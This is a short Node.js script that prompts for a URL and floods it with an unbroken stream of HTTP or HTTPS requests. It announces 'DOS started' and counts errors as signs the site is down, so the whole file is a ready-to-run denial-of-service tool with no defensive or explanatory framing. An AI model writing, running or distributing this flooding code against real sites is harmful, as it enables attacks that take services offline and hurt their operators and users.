const http = require("http");
const https = require("https");
const readline = require("readline");
const rl = readline.createInterface({
    input: process.stdin,
    output: process.stdout
});
let requests = 0;
let rimprimir = 10;
let errors = 0;
let eimprimir = 10;
function httpdos(url){
        console.log(`DOS started to ${url}`);
        let interval = setInterval(function(){
            const req = http.request(url, res => {
                requests++;
                if(requests === rimprimir){
                    console.log(`(${requests}) Requests send it! Status ${res.statusCode}`);
                    rimprimir = rimprimir + 10;
                }
            })
            req.on("error", error => {
                errors++;
                if(errors === eimprimir){
                    console.log(`(${errors}) Erros ocurred! This is because web is down or other thing`);
                    eimprimir = eimprimir + 10;
                }
                //return clearInterval(interval);
            })
            req.end()
        }, 0)
}
function httpsdos(url){
    console.log(`DOS started to ${url}`);
    let interval = setInterval(function(){
        const req = https.request(url, res => {
            requests++;
            if(requests === rimprimir){
                console.log(`(${requests}) Requests send it! Status ${res.statusCode}`);
                rimprimir = rimprimir + 10;
            }
        })
        req.on("error", error => {
            errors++;
            if(errors === eimprimir){
                console.log(`(${errors}) Erros ocurred! This is because web is down or other thing`);
                eimprimir = eimprimir + 10;
                //return clearInterval(interval);
            }
        })
        req.end()
    }, 0)
}
rl.question("Url(https://www.example.com/): ", (url) => {
        if(url[4] === ":"){
            httpdos(url);
        }else if(url[4] === "s"){
            httpsdos(url);
        }
})
